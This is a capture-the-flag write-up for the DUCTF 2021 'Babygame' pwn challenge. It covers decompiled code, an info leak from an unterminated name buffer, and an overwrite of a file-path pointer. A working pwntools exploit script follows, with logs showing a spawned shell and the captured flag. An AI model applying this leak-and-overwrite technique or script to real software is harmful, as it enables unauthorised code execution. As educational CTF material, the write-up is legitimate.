# Babygame

## Description
Not your typical shell game...

Admin note: the server runs in a restricted environment where some of your favourite files might not exist. If you need a file for your exploit, use a file you know definitely exists (the binary tells you of at least one!)

Author: grub

nc pwn-2021.duc.tf 31907

## Analysis
IDA:
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int num; // [rsp+Ch] [rbp-4h]

  init(argc, argv, envp);
  puts("Welcome, what is your name?");
  read(0, NAME, 0x20uLL);
  RANDBUF = "/dev/urandom";
  while ( 1 )
  {
    while ( 1 )
    {
      print_menu();
      num = get_num();
      if ( num != 1337 )
        break;
      game();
    }
    if ( num > 1337 )
    {
LABEL_10:
      puts("Invalid choice.");
    }
    else if ( num == 1 )
    {
      set_username();
    }
    else
    {
      if ( num != 2 )
        goto LABEL_10;
      print_username();
    }
  }
}

int print_menu()
{
  puts("1. Set Username");
  puts("2. Print Username");
  return printf(format);
}

int get_num()
{
  char buf[12]; // [rsp+Ch] [rbp-14h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  read(0, buf, 0xBuLL);
  return atoi(buf);
}

unsigned __int64 game()
{
  FILE *stream; // [rsp+8h] [rbp-18h]
  int ptr; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  stream = fopen(RANDBUF, "rb");
  fread(&ptr, 1uLL, 4uLL, stream);
  printf("guess: ");
  if ( get_num() == ptr )
    system("/bin/sh");
  return v3 - __readfsqword(0x28u);
}

size_t set_username()
{
  FILE *v0; // rbx
  size_t v1; // rax

  puts("What would you like to change your username to?");
  v0 = stdin;
  v1 = strlen(NAME);
  return fread(NAME, 1uLL, v1, v0);
}

int print_username()
{
  return puts(NAME);
}
```

The first thing we notice is that if we input 1337 in the menu, the `game` function is called.
Another weird thing is that inside `set_username` the length of the data that is going to be read
is `strlen(NAME)`, which means that if the second time we provide a name longer than the previous one,
only the length of the first one will be read.

Let's look at the `NAME`:
```
.bss:00000000000040A0 NAME            db 20h dup(?)           ; DATA XREF: main+26↑o
```
It's a global variable with length 0x20. Let's look now at the first time `NAME` is read:
```
read(0, NAME, 0x20uLL);
```
We read 0x20 bytes into a 0x20 buffer. But if we read *exactly* 0x20 bytes, then we won't have a null terminator.
When `print_username` will be called, it will print much more than `NAME`, it will stop at the first null byte which
definitely isn't in `NAME`. Let's test our guess:

```
from pwn import *

context.log_level = 'debug'

r = process("./babygame")

r.recvuntil(b"name?")
r.send(b"A" * 0x1f + b"B")
r.recvuntil(b">")
r.sendline(b"2")
print(r.recvline())
```

```
[DEBUG] Received 0x1c bytes:
    b'Welcome, what is your name?\n'
[DEBUG] Sent 0x20 bytes:
    b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB'
[DEBUG] Received 0x24 bytes:
    b'1. Set Username\n'
    b'2. Print Username\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x4b bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 42  │AAAA│AAAA│AAAA│AAAB│
    00000020  24 40 17 ef  71 55 0a 31  2e 20 53 65  74 20 55 73  │$@··│qU·1│. Se│t Us│
    00000030  65 72 6e 61  6d 65 0a 32  2e 20 50 72  69 6e 74 20  │erna│me·2│. Pr│int │
    00000040  55 73 65 72  6e 61 6d 65  0a 3e 20                  │User│name│·> │
    0000004b
b' AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB$@\x17\xefqU\n'
[*] Stopped process './babygame' (pid 2704)
[*] Closed connection to pwn-2021.duc.tf port 31907
```

As we can see, it leaked more than the `NAME`. After `NAME` comes `RANDBUF`, which is 
the path the random number will be read from. We also know that the size of the new `NAME`
is `strlen(old name)`, which means that now we can also overwrite the `RANDBUF`!
The idea is to write the new path in `NAME`, then overwrite `RANDBUF` with the address of `NAME`, 
so when it generates the random number we can control where it reads it from.
My first idea was `/dev/null` because it only outputs zeroes, but it didn't exist in the chroot the challenge
is running in. But one file that we definitely know it exists is `flag.txt`. We also know that the
first four bytes of the flag is `DUCT`, which is 1413698884 if we translate it into a dword.

So, steps:
- set the first name to any 0x20 characters
- check that printing the name prints the address of randbuf
- get the leaked address and calculate the base of the binary
- calculate the address of name
- send the name as "flag.txt\x00" + random chars + address of name
- send 1337 to call `game`
- send "1413698884"
- profit

For the calculations we use the gdb disassembly:

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x00005555555551c9 <+0>:     push   rbp
   0x00005555555551ca <+1>:     mov    rbp,rsp
   0x00005555555551cd <+4>:     sub    rsp,0x10
   0x00005555555551d1 <+8>:     mov    eax,0x0
   0x00005555555551d6 <+13>:    call   0x55555555527d <init>
   0x00005555555551db <+18>:    lea    rax,[rip+0xe26]        # 0x555555556008
   0x00005555555551e2 <+25>:    mov    rdi,rax
   0x00005555555551e5 <+28>:    call   0x555555555030 <puts@plt>
   0x00005555555551ea <+33>:    mov    edx,0x20
   0x00005555555551ef <+38>:    lea    rax,[rip+0x2eaa]        # 0x5555555580a0 <NAME>
   0x00005555555551f6 <+45>:    mov    rsi,rax
   0x00005555555551f9 <+48>:    mov    edi,0x0
   0x00005555555551fe <+53>:    call   0x555555555090 <read@plt>
   0x0000555555555203 <+58>:    lea    rax,[rip+0xe1a]        # 0x555555556024
   0x000055555555520a <+65>:    mov    QWORD PTR [rip+0x2eaf],rax        # 0x5555555580c0 <RANDBUF>
   0x0000555555555211 <+72>:    mov    eax,0x0
   0x0000555555555216 <+77>:    call   0x55555555530f <print_menu>
   0x000055555555521b <+82>:    mov    eax,0x0
   0x0000555555555220 <+87>:    call   0x5555555552c0 <get_num>
   0x0000555555555225 <+92>:    mov    DWORD PTR [rbp-0x4],eax
   0x0000555555555228 <+95>:    cmp    DWORD PTR [rbp-0x4],0x539
   0x000055555555522f <+102>:   je     0x555555555260 <main+151>
   0x0000555555555231 <+104>:   cmp    DWORD PTR [rbp-0x4],0x539
   0x0000555555555238 <+111>:   jg     0x55555555526c <main+163>
   0x000055555555523a <+113>:   cmp    DWORD PTR [rbp-0x4],0x1
   0x000055555555523e <+117>:   je     0x555555555248 <main+127>
   0x0000555555555240 <+119>:   cmp    DWORD PTR [rbp-0x4],0x2
   0x0000555555555244 <+123>:   je     0x555555555254 <main+139>
   0x0000555555555246 <+125>:   jmp    0x55555555526c <main+163>
   0x0000555555555248 <+127>:   mov    eax,0x0
   0x000055555555524d <+132>:   call   0x555555555348 <set_username>
   0x0000555555555252 <+137>:   jmp    0x55555555527b <main+178>
   0x0000555555555254 <+139>:   mov    eax,0x0
   0x0000555555555259 <+144>:   call   0x555555555397 <print_username>
   0x000055555555525e <+149>:   jmp    0x55555555527b <main+178>
   0x0000555555555260 <+151>:   mov    eax,0x0
   0x0000555555555265 <+156>:   call   0x5555555553ad <game>
   0x000055555555526a <+161>:   jmp    0x55555555527b <main+178>
   0x000055555555526c <+163>:   lea    rax,[rip+0xdbe]        # 0x555555556031
   0x0000555555555273 <+170>:   mov    rdi,rax
   0x0000555555555276 <+173>:   call   0x555555555030 <puts@plt>
   0x000055555555527b <+178>:   jmp    0x555555555211 <main+72>
End of assembler dump.
```

We also get the binary base:
```
gdb-peda$ info proc map
process 3078
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x555555554000     0x555555555000     0x1000        0x0 /home/kali/Downloads/babygame
      0x555555555000     0x555555556000     0x1000     0x1000 /home/kali/Downloads/babygame
      0x555555556000     0x555555557000     0x1000     0x2000 /home/kali/Downloads/babygame
      0x555555557000     0x555555558000     0x1000     0x2000 /home/kali/Downloads/babygame
      0x555555558000     0x555555559000     0x1000     0x3000 /home/kali/Downloads/babygame
      0x7ffff7def000     0x7ffff7e14000    0x25000        0x0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
      0x7ffff7e14000     0x7ffff7f5f000   0x14b000    0x25000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
      0x7ffff7f5f000     0x7ffff7fa9000    0x4a000   0x170000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
      0x7ffff7fa9000     0x7ffff7faa000     0x1000   0x1ba000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
      0x7ffff7faa000     0x7ffff7fad000     0x3000   0x1ba000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
      0x7ffff7fad000     0x7ffff7fb0000     0x3000   0x1bd000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
      0x7ffff7fb0000     0x7ffff7fb6000     0x6000        0x0 
      0x7ffff7fcc000     0x7ffff7fd0000     0x4000        0x0 [vvar]
      0x7ffff7fd0000     0x7ffff7fd2000     0x2000        0x0 [vdso]
      0x7ffff7fd2000     0x7ffff7fd3000     0x1000        0x0 /usr/lib/x86_64-linux-gnu/ld-2.31.so
      0x7ffff7fd3000     0x7ffff7ff3000    0x20000     0x1000 /usr/lib/x86_64-linux-gnu/ld-2.31.so
      0x7ffff7ff3000     0x7ffff7ffb000     0x8000    0x21000 /usr/lib/x86_64-linux-gnu/ld-2.31.so
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x29000 /usr/lib/x86_64-linux-gnu/ld-2.31.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x2a000 /usr/lib/x86_64-linux-gnu/ld-2.31.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]

```
Binary base: 0x555555554000

Let's also check the security:
```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
```

PIE is enabled, so we can't brute force an address. But we leak one anyway, and the offsets never change.

We see at `main+58`, 0x555555556024 is loaded into RAX, then it is stored in RANDBUF.

0x555555556024 - 0x555555554000 = 0x2024

So the binary base will be at `leaked address` - 0x2024.

Let's see the address of NAME. At `main+38` we see that the address of NAME in the current context
is 0x5555555580a0

0x5555555580a0 - 0x555555554000 = 0x40a0

So name will be at `base` + 0x40a0.

```python
from pwn import *

context.log_level = 'debug'

r = remote("pwn-2021.duc.tf", 31907)

r.recvuntil(b"name?")
r.send(b"A" * 0x1f + b"B")
r.recvuntil(b">")
r.sendline(b"2")
base = u64(r.recvline().split(b"B")[1].strip(b"\n").ljust(8, b"\x00")) - 0x2024
log.success("base = " + hex(base))
name = base + 45 + 0x40a0
log.success("name = " + hex(name))
r.sendline(b"1")
r.recvuntil(b"to?")
randbuf = b"flag.txt\x00"
r.send(randbuf + b"B" * (0x20 - len(randbuf)) + p64(name)) 
r.recvuntil(b">")
r.sendline(b"1337")
r.recvuntil(b"guess: ")
r.sendline(b"1413698884")
r.interactive()
```

```
[+] Opening connection to pwn-2021.duc.tf on port 31907: Done
[DEBUG] Received 0x1c bytes:
    b'Welcome, what is your name?\n'
[DEBUG] Sent 0x20 bytes:
    b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB'
[DEBUG] Received 0x24 bytes:
    b'1. Set Username\n'
    b'2. Print Username\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x4b bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 42  │AAAA│AAAA│AAAA│AAAB│
    00000020  24 e0 8e 38  77 55 0a 31  2e 20 53 65  74 20 55 73  │$··8│wU·1│. Se│t Us│
    00000030  65 72 6e 61  6d 65 0a 32  2e 20 50 72  69 6e 74 20  │erna│me·2│. Pr│int │
    00000040  55 73 65 72  6e 61 6d 65  0a 3e 20                  │User│name│·> │
    0000004b
[+] base = 0x5577388ed1c9
[+] name = 0x5577388f00a0
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x30 bytes:
    b'What would you like to change your username to?\n'
[DEBUG] Sent 0x28 bytes:
    00000000  66 6c 61 67  2e 74 78 74  00 42 42 42  42 42 42 42  │flag│.txt│·BBB│BBBB│
    00000010  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    00000020  a0 00 8f 38  77 55 00 00                            │···8│wU··│
    00000028
[DEBUG] Received 0x58 bytes:
    b'1. Set Username\n'
    b'2. Print Username\n'
    b'> Invalid choice.\n'
    b'1. Set Username\n'
    b'2. Print Username\n'
    b'> '
[DEBUG] Sent 0x5 bytes:
    b'1337\n'
[DEBUG] Received 0x7 bytes:
    b'guess: '
[DEBUG] Sent 0xb bytes:
    b'1413698884\n'
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0xd bytes:
    b'flag.txt\n'
    b'pwn\n'
flag.txt
pwn
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x21 bytes:
    b'DUCTF{whats_in_a_name?_5aacfc58}\n'
DUCTF{whats_in_a_name?_5aacfc58}
```
